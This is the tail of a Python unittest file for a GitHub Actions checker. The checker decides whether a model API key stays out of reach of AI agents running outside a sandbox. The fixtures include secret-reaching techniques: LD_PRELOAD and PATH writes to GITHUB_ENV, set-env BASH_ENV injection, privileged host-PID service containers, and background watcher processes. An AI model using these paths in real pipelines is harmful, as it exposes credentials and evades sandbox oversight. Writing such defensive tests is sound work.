        self.assertEqual(control.verdict, CANNOT_TELL)
        self.assertIn("reusable workflow", control.detail)

    def test_a_name_the_action_refuses_is_not_met(self):
        self.assertEqual(self.key(keyed(model_keys=None, env_input="ANTHROPIC_API_KEY")).verdict, NOT_MET)

    def test_with_every_control_the_checker_reads_in_place_only_the_setting_is_left(self):
        """The fifth control does not make OBAAF-GHA-005 clearable on its own: the environment's settings
        are still not read by `obaaf check`, so the best it can be is "cannot tell"."""
        config = {"lanes": {".github/workflows/agent.yml#agent": "agent"},
                  "protected_secrets": {"*_API_KEY": "main-only"}}
        result = run_check(workflow(CHECKOUT + "\n" + keyed(), job_extra="    environment: main-only"),
                           config=config)
        secret = secret_finding(result)
        self.assertEqual({c.id: c.verdict for c in secret.controls},
                         {"secrets-protected": VERIFIED, "environment-restricted": CANNOT_TELL,
                          "no-outsider-input": VERIFIED, "egress-enforced": VERIFIED, "key-out-of-reach": VERIFIED})
        self.assertEqual(secret.state, "cannot-tell")
        self.assertIn("(it is cleared when all 5 are verified):", report.to_text(result))

    def test_moving_a_key_behind_the_proxy_keeps_its_acceptance(self):
        """Controls are not part of what a finding is, so a baseline entry that accepts OBAAF-GHA-005 on a
        job matches before and after the job moves its key from the command to the proxy, and before and
        after this control existed."""
        env = {"ANTHROPIC_API_KEY": "${{ secrets.ANTHROPIC_API_KEY }}"}
        passed = secret_finding(run_check(workflow(keyed(model_keys=None, env_input=None, step_env=env,
                                                        run="claude -p '${{ secrets.ANTHROPIC_API_KEY }}'"))))
        proxied = secret_finding(run_check(workflow(keyed())))
        self.assertEqual(baseline.key(passed), baseline.key(proxied))
        self.assertNotIn("controls", baseline.identity(proxied))


class KeyOutOfReachBeforeAndBesideTest(unittest.TestCase):
    """What can run before or beside the step that holds the key (found by the first review of 2c.7).
    That step's own bash steps run outside the sandbox with the key in their environment, so an agent
    outside the sandbox before it, a process left running, a parallel step, a service container or a
    write to GITHUB_ENV or GITHUB_PATH could reach the key there."""

    def key(self, steps, **kw):
        return key_control(run_check(workflow(steps, **kw)))

    def test_an_agent_outside_the_sandbox_before_or_beside_it_is_not_met(self):
        cases = {
            "an agent CLI before": "      - run: claude -p 'plan the change' > plan.txt\n" + keyed(run="cat plan.txt"),
            "an agent action before": (f"      - uses: anthropics/claude-code-action@{SHA}\n        with: {{prompt: plan}}\n"
                                       + keyed()),
            "an agent in a parallel step": ("      - parallel:\n"
                                            "          - run: claude -p 'review'\n"
                                            + "\n".join("    " + line for line in keyed().splitlines())),
        }
        for name, steps in cases.items():
            control = self.key(steps)
            with self.subTest(name):
                self.assertEqual(control.verdict, NOT_MET, control.detail)
                self.assertIn("outside the sandbox, before or beside the step that holds the key", control.detail)

    def test_a_credential_any_step_could_use_is_not_met(self):
        steps = "      - run: gh api user\n        env: {GH_TOKEN: '${{ github.token }}'}\n" + keyed()
        self.assertEqual(self.key(steps).verdict, NOT_MET)
        self.assertEqual(self.key(keyed(), permissions="{contents: read, models: read}").verdict, NOT_MET)
        self.assertEqual(self.key(keyed(), permissions="{contents: read, id-token: write}").verdict, NOT_MET)
        undeclared = workflow(keyed(), permissions=None).replace("permissions: {}\n", "")
        self.assertEqual(key_control(run_check(undeclared)).verdict, CANNOT_TELL)

    def test_an_unknown_agent_before_a_key_that_reaches_nothing_is_cannot_tell(self):
        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
        steps = "      - run: python agents/fix.py\n" + keyed(model_keys=None, step_env=env, run="make lint")
        control = self.key(steps)
        self.assertEqual(control.verdict, CANNOT_TELL)
        self.assertIn("cannot tell where the agent runs", control.detail)

    def test_what_runs_before_or_beside_it_is_read_for_each_step_that_holds_a_key(self):
        decoy = action(run="true", step_id="decoy")
        cases = {
            "a process left running after a decoy use of the action": (
                decoy + "\n      - run: nohup ./watch.sh &\n" + keyed()),
            "the action at a branch before it": action(run="true", ref="main", step_id="decoy") + "\n" + keyed(),
            "a parallel sibling": ("      - parallel:\n          - run: ./watch.sh\n"
                                   + "\n".join("    " + line for line in keyed().splitlines())),
            "a background step before it": "      - run: ./watch.sh\n        background: true\n" + keyed(),
            "a step after one that runs in the background": (
                keyed().replace("      - id: agent\n", "      - id: agent\n        background: true\n")
                + "\n      - run: ./watch.sh"),
            "GITHUB_PATH before it": "      - run: echo \"$HOME/bin\" >> \"$GITHUB_PATH\"\n" + keyed(),
            "GITHUB_ENV before it": "      - run: echo \"LD_PRELOAD=$PWD/x.so\" >> \"$GITHUB_ENV\"\n" + keyed(),
            "core.exportVariable before it": (f"      - uses: actions/github-script@{SHA}\n"
                                              "        with: {script: \"core.exportVariable('X', '1')\"}\n" + keyed()),
            "LD_PRELOAD in the job's env": dict(steps=keyed(), job_extra="    env: {LD_PRELOAD: ./x.so}"),
            "PATH in the step's env": keyed(step_env={"ANTHROPIC_API_KEY": "${{ secrets.ANTHROPIC_API_KEY }}",
                                                       "PATH": "./bin:/usr/bin"}),
            "a service container with options": dict(
                steps=keyed(), job_extra="    services:\n      helper:\n        image: someone/tool:latest\n"
                                         "        options: --privileged --pid=host"),
        }
        for name, case in cases.items():
            control = self.key(**case) if isinstance(case, dict) else self.key(case)
            with self.subTest(name):
                self.assertEqual(control.verdict, CANNOT_TELL, control.detail)

    def test_an_accepted_install_does_not_count_as_an_agent_seen(self):
        """Found by the second review: an install step that 2c.8 accepts switched the "no evidence" rule off."""
        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
        steps = (CHECKOUT + "\n      - run: sudo npm install -g @anthropic-ai/claude-code\n"
                 "      - run: python agents/fix.py\n" + keyed(model_keys=None, step_env=env, run="make lint"))
        control = self.key(steps)
        self.assertEqual(control.verdict, CANNOT_TELL)
        self.assertIn("cannot tell where the agent runs", control.detail)

    def test_unsecure_workflow_commands_are_cannot_tell(self):
        """Found by the second review: with ACTIONS_ALLOW_UNSECURE_COMMANDS, a line an earlier step prints
        (`::set-env name=BASH_ENV::...`) sets a variable for the step that holds the key."""
        before = "      - run: gh issue view 1\n"
        for kw in ({"steps": before + keyed(), "job_extra": "    env: {ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'}"},
                   {"steps": before + "        env: {actions_allow_unsecure_commands: 'true'}\n" + keyed()}):
            with self.subTest(**kw):
                self.assertEqual(self.key(**kw).verdict, CANNOT_TELL)

    def test_steps_after_it_cannot_reach_the_key(self):
        """The step's process has ended; a later step can still matter to OBAAF-GHA-020, not to this."""
        steps = keyed() + f"\n      - uses: actions/upload-artifact@{SHA}\n        with: {{name: out, path: out}}\n" \
                          "      - run: nohup ./later.sh &"
        self.assertEqual(self.key(CHECKOUT + "\n" + steps).verdict, VERIFIED)


if __name__ == "__main__":
    unittest.main()
